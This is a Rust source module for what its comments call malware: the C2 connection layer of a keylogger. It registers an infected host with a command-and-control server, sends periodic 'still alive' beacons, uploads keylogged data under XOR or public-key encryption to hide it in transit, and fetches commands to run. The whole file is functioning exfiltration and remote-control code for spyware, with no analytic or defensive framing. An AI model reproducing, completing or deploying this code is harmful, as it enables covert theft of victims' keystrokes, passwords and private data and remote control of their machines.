use serde_json::{json, Value};
use crate::encode::{EncodeConnection};

//struct that maintains the server connection
//this provides a centralized point of connection
pub struct Connection<'a>{
    url: &'a str,
    reg: &'a str,
    becon: &'a str,
    upload: &'a str,
    command: &'a str,
    server: reqwest::Client,
    encoder: EncodeConnection
}

//implementation of the connection struct
impl<'a> Connection<'a>{

    //constructor of the connection struct
    //this initalizes all possible paths and uses one connection type and encoder
    pub fn new(url : &'a str, key: u8, pub_key: String) -> Connection<'a>{

        Connection{
            url:url,
            reg: "/register",
            becon: "/becon",
            upload: "/upload",
            command: "/command",
            server: reqwest::Client::new(),
            encoder: EncodeConnection::new(key,pub_key)
        }
    }


    //function that registers itself to the c2 server
    pub async fn register(&self, os:& str) -> Result<String, reqwest::Error> {

        let url = format!("{}{}",self.url,self.reg);
        
        //make the json payload
        //containing the OS and xor key
        let json_payload = json!({
            "OS": os,
            "key": self.encoder.get_key()
        });

        //encrypt the json payload using the public key
        let payload = self.encode_json_payload_pub(&json_payload);
        
        //sends a post request to the data to the "register" end point
        let response = self.server.post(url)
        .json(&payload)
        .send()
        .await?;

        Ok(response.text().await?)
    }

    //fiunction that sends a becon to the c2 server
    //this is to notify the c2 server that this malware is still alive
    pub async fn becon(&self, id:& str) -> Result<String, reqwest::Error> {

        //construct the url with "becon" end point
        let url = format!("{}{}",self.url,self.becon);

        //construct the json paylaod with id and timestamp
        let json_payload = json!({
            "id": id,
            "timestamp":&chrono::Utc::now().to_string()
        });

        //encrypt the payload using xor
        let payload = self.encode_json_payload(&json_payload, &id);

        //sends a post rquest to the becon end point
        let response = self.server.post(url)
        .json(& payload)
        .send()
        .await?;

        //return the response
        Ok(response.text().await?)
    }

    //function that sends the keylogged file to the c2 server
    pub async fn send_data(&self, id:& str, data: &String) -> Result<String, reqwest::Error> {
        
        //construct the url with "upload" end point
        let url = format!("{}{}",self.url,self.upload);
        //json payload
        let json_payload = json!({
            "id" : &id,
            "log": &data
        });
        //encrypt with xor
        let payload = self.encode_json_payload(&json_payload, &id);

        //send data
        let response = self.server.post(url)
        .json(&payload)
        .send()
        .await?;

        Ok(response.text().await?)
    }

    //function that sends a get request to get commands
    pub async fn get_command(&self, id:& str,) -> Result<String, reqwest::Error> {

        //construct the url with "command" end point
        let url = format!("{}{}",self.url,self.command);
        let params = [("id", id)];

        //send data
        let response = self.server.get(url)
        .form(&params)
        .send()
        .await?;
        
        let decoded = self.encoder.decrypt(response.text().await?.as_str());

        match serde_json::from_str::<serde_json::Value>(decoded.as_str()) {
        
        //checks if the command is valid
        Ok(val) => {
            let cmd = val["cmd"].as_str().unwrap_or("None").to_string();
            Ok(cmd)
        },
            Err(_) => Ok("None".to_string()),
    
        }

    }


    //HELPER FUNCTION

    //function that encodes the json using the encoder
    //this encrypts the data as it's sent over the internet
    //making it harder for them to read it
    fn encode_json_payload(&self, json_payload: &Value, id:& str) -> Value{
        
        //make the json into a string
        let json_string = serde_json::to_string(&json_payload).unwrap();

        //encrypt the json using xor
        let encrypted = self.encoder.encrypt(&json_string);
        
        //put the encrypted data into a sjon that is sent of
        json!({
            "id": id,
            "data": encrypted
        })
        

    }

    //function that encodes the json with public key encryption
    //this makes it only decryptable by the c2 server
    //only used for registration
    fn encode_json_payload_pub(&self, json_payload: &Value) -> Value{
        
        //make the json into a string
        let json_string = serde_json::to_string(&json_payload).unwrap();

        //encrypt the json using the publick key
        let encrypted = self.encoder.pub_key_enc(&json_string);

        //put the encrypted data into a sjon that is sent of
        json!({
            "data": encrypted
         })

    }
    
}
